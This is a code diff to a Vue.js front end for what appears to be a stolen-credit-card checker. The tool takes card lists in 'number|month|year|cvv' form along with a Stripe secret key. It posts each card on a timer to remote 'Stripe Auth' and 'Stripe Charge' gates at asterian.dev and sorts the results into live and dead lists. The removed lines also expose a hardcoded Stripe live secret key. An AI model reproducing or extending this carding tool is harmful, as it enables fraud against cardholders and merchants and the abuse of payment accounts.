@@ -13,7 +13,6 @@
               :placeholder="cc"
               :cols="35"
               :rows="10"
-              :rules="[(value) => !!value || 'Required.']"
               v-model="ccs"
             ></v-textarea>
             <v-text-field
@@ -45,56 +44,21 @@
               @click="checkSK"
               >Check SK</v-btn
             >
-            <v-menu transition="scroll-y-transition">
-              <template v-slot:activator="{ on, attrs }">
-                <v-btn class="mb-5" color="secondary" v-bind="attrs" v-on="on">
-                  {{ gate == 0 ? "Stripe Auth" : "Stripe Charge" }}
-                </v-btn>
-              </template>
-              <v-list>
-                <v-list-item-group v-model="gate">
-                  <v-list-item>
-                    <v-list-item-title>Gate 1 : Stripe Auth</v-list-item-title>
-                  </v-list-item>
-                  <v-list-item>
-                    <v-list-item-title
-                      >Gate 2 : Stripe Charge</v-list-item-title
-                    >
-                  </v-list-item>
-                </v-list-item-group>
-              </v-list>
-            </v-menu>
-            <v-menu transition="scroll-y-transition">
-              <template v-slot:activator="{ on, attrs }">
-                <v-btn
-                  class="ml-5 mb-5"
-                  color="secondary"
-                  v-bind="attrs"
-                  v-on="on"
-                >
-                  {{
-                    delay == 0
-                      ? "1 second"
-                      : delay == 1
-                      ? "2 seconds"
-                      : "3 seconds"
-                  }}
-                </v-btn>
-              </template>
-              <v-list>
-                <v-list-item-group v-model="delay">
-                  <v-list-item>
-                    <v-list-item-title>Delay : 1 second</v-list-item-title>
-                  </v-list-item>
-                  <v-list-item>
-                    <v-list-item-title>Delay : 2 seconds</v-list-item-title>
-                  </v-list-item>
-                  <v-list-item>
-                    <v-list-item-title>Delay : 3 seconds</v-list-item-title>
-                  </v-list-item>
-                </v-list-item-group>
-              </v-list>
-            </v-menu>
+            <v-select
+              :items="gates"
+              label="Choose Gate"
+              style="width:150px"
+              class="d-inline-block mr-5"
+              v-model="gate"
+            ></v-select>
+            <v-select
+              :items="delays"
+              label="Choose Delay"
+              style="width:150px"
+              v-model="delay"
+              class="d-inline-block"
+            ></v-select>
+
             <v-switch
               v-model="switch1"
               class="pt-4 pb-4"
@@ -215,6 +179,20 @@
         </div>
       </v-tab-item>
     </v-tabs-items>
+    <v-fab-transition>
+      <v-btn
+        v-show="current_table == 1 && dead.length != 0"
+        absolute
+        bottom
+        right
+        fab
+        class="mr-7"
+        style="margin-bottom:100px"
+        @click="clearDead"
+      >
+        <v-icon color="error">mdi-delete</v-icon>
+      </v-btn>
+    </v-fab-transition>
     <v-snackbar v-model="noti" :color="noticolor" :timeout="1500">
       {{ notitext }}
 
@@ -234,16 +212,18 @@ export default {
     return {
       cc:
         "Input Format\nxxxxxxxxxxxxxxxx|xx|xxxx|xxx\nxxxxxxxxxxxxxxxx|xx|xxxx|xxx\nxxxxxxxxxxxxxxxx|xx|xxxx|xxx\nxxxxxxxxxxxxxxxx|xx|xxxx|xxx\nxxxxxxxxxxxxxxxx|xx|xxxx|xxx\nxxxxxxxxxxxxxxxx|xx|xxxx|xxx\nxxxxxxxxxxxxxxxx|xx|xxxx|xxx\nxxxxxxxxxxxxxxxx|xx|xxxx|xxx",
-      dead: [{ number: "Quentin", result: "Gonus" }],
-      ccn: [{ number: "Quentin", result: "Gonus" }],
-      livecvv: [{ number: "Quentin", result: "Gonus" }],
+      dead: [],
+      ccn: [],
+      livecvv: [],
       current_table: 0,
       tab: null,
       loading2: false,
       skcheck: false,
       switch1: false,
-      gate: 0,
-      delay: 0,
+      gates: ["Stripe Auth", "Stripe Charge"],
+      delays: ["1 second", "2 seconds", "3 seconds"],
+      gate: "Stripe Auth",
+      delay: "1 second",
       noti: false,
       notitext: "Your SK is Live",
       noticolor: "success",
@@ -252,8 +232,16 @@ export default {
     };
   },
   methods: {
+    clearDead() {
+      this.dead = [];
+    },
     changeTable(table) {
       this.current_table = this.current_table == table ? 0 : table;
+    },
+    deleteline() {
+      let ccs = this.ccs.split("\n");
+      ccs.splice(0, 1);
+      this.ccs = ccs.join("\n");
     },
     checkCC() {
       if (this.ccs == null || this.ccs == "") {
@@ -262,7 +250,93 @@ export default {
         this.noti = true;
         return null;
       }
+      if (this.sk == null || this.sk == "") {
+        this.notitext = "No SK input!";
+        this.noticolor = "error";
+        this.noti = true;
+        return null;
+      }
+      this.tab = 1;
       this.loading2 = true;
+      localStorage.setItem("sk_key", this.sk);
+      let tmpdelay =
+        this.delay == "1 second"
+          ? 1000
+          : this.delay == "2 seconds"
+          ? 2000
+          : 3000;
+      let checkInterval = setInterval(() => {
+        if (this.ccs == "") {
+          this.loading2 = false;
+          clearInterval(checkInterval);
+        } else {
+          let tmpcc = this.ccs.split("\n")[0];
+          if (this.gate == "Stripe Auth") {
+            this.check(tmpcc);
+          } else {
+            this.charge(tmpcc);
+          }
+          this.deleteline();
+        }
+      }, tmpdelay);
+    },
+    check(cc) {
+      axios
+        .post("https://asterian.dev/checker.php", {
+          cc: cc,
+          sk_key: this.sk,
+        })
+        .then((res) => {
+          let data = res.data;
+          if (res.data.includes("CVV LIVE")) {
+            this.livecvv.push({
+              number: data
+                .split(">")[0]
+                .trim()
+                .replace("CVV LIVE ", ""),
+              result: data.split(">")[1],
+            });
+          } else if (res.data.includes("CCN LIVE")) {
+            this.dead.push({
+              number: data
+                .split(">")[0]
+                .trim()
+                .replace("CCN LIVE ", ""),
+              result: data.split(">")[1],
+            });
+          } else {
+            if (data.includes("SK")) {
+              this.dead.push({
+                number: "SK Error",
+                result: "Your SK is invalid or dead.",
+              });
+            } else {
+              this.dead.push({
+                number: data
+                  .split(">")[0]
+                  .trim()
+                  .replace("DEAD ", ""),
+                result: data.split(">")[1],
+              });
+            }
+          }
+        });
+    },
+    charge(cc) {
+      axios
+        .post("https://asterian.dev/charge.php", {
+          cc: cc,
+          sk_key: this.sk,
+        })
+        .then((res) => {
+          if (res.data.includes("CVV LIVE")) {
+            this.livecvv.push(res.data);
+          } else if (res.data.includes("CCN LIVE")) {
+            this.ccn.push(res.data);
+          } else {
+            this.dead.push(res.data);
+          }
+        });
     },
     checkSK() {
       if (this.sk == null || this.sk == "") {
@@ -271,30 +345,30 @@ export default {
         this.noti = true;
         return null;
       }
-      var data = {
-        sk:
-          "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",
-      };
-
-      var config = {
-        method: "post",
-        url: "https://asterian.dev/sk.php",
-        headers: {
-          "Content-Type": "text/plain",
-        },
-        data: data,
-      };
-
-      axios(config)
-        .then(function(response) {
-          console.log(JSON.stringify(response.data));
-        })
-        .catch(function(error) {
-          console.log(error);
-        });
       this.skcheck = true;
-      this.noti = true;
+      axios
+        .post("https://asterian.dev/sk.php", { sk: this.sk })
+        .then(({ data }) => {
+          if (data.includes("LIVE")) {
+            this.notitext = "Your SK is Live.";
+            this.noticolor = "success";
+            this.noti = true;
+            this.skcheck = false;
+          } else {
+            this.notitext = "Your SK is Dead.";
+            this.noticolor = "error";
+            this.noti = true;
+            this.skcheck = false;
+            this.sk = "";
+          }
+        });
     },
+  },
+  created() {
+    let tmpsk = localStorage.getItem("sk_key");
+    if (tmpsk != null && tmpsk != "" && tmpsk != "null") {
+      this.sk = tmpsk;
+    }
   },
 };
 </script>
